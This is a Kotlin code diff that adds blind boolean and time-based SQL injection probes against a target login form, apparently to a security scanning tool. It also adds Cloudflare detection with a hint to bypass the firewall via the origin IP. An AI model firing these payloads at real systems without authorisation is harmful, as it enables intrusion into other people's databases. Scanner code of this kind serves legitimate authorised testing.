@@ -449,9 +449,70 @@ private suspend fun testSqlInjection(url: String, addResult: (String, String) ->
         }
     }
 
+    // Blind SQLi test
     if (!vulnFound) {
-        addResult("INFO", "No SQL injection found (parameterized queries likely used)")
-        addResult("INFO", "Note: Cloudflare/WAF may be blocking payloads")
+        addResult("INFO", "Testing blind SQLi...")
+        val blindPayloads = listOf("1 AND 1=1", "1 AND 1=2")
+        val baseBody = try {
+            val conn = URL(url).openConnection() as HttpURLConnection
+            conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 8000
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+            conn.outputStream.write("login=admin&password=test".toByteArray())
+            val b = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
+            conn.disconnect(); b
+        } catch (_: Exception) { "" }
+
+        for (bp in blindPayloads) {
+            try {
+                val conn = URL(url).openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 8000
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+                conn.outputStream.write("login=${URLEncoder.encode(bp, "UTF-8")}&password=x".toByteArray())
+                val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
+                conn.disconnect()
+                if (body == baseBody && bp.contains("1=1")) {
+                    addResult("VULN", "Blind SQLi: $bp returns same response as normal")
+                    vulnFound = true; break
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
+    // Time-based SQLi
+    if (!vulnFound) {
+        addResult("INFO", "Testing time-based blind SQLi...")
+        val timePayloads = listOf("\' OR SLEEP(3)--", "\' OR pg_sleep(3)--")
+        for (tp in timePayloads) {
+            try {
+                val start = System.currentTimeMillis()
+                val conn = URL(url).openConnection() as HttpURLConnection
+                conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 15000; conn.readTimeout = 15000
+                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+                conn.outputStream.write("login=${URLEncoder.encode(tp, "UTF-8")}&password=x".toByteArray())
+                conn.inputStream?.readBytes(); conn.disconnect()
+                val elapsed = System.currentTimeMillis() - start
+                if (elapsed > 2500) {
+                    addResult("VULN", "Time-based SQLi: $tp (took ${elapsed}ms)")
+                    vulnFound = true; break
+                }
+            } catch (_: Exception) {}
+        }
+    }
+
+    // Cloudflare detection
+    try {
+        val conn = URL(url).openConnection() as HttpURLConnection
+        conn.connectTimeout = 5000; conn.setRequestProperty("User-Agent", "Mozilla/5.0")
+        val cf = conn.getHeaderField("cf-ray"); conn.disconnect()
+        if (cf != null) addResult("WARN", "Cloudflare detected! Try origin IP or browser bypass")
+    } catch (_: Exception) {}
+
+    if (!vulnFound) {
+        addResult("INFO", "No SQL injection found (parameterized queries or WAF)")
+        addResult("INFO", "Tip: Try sqlmap or Burp Suite for deeper testing")
     }
 }
 
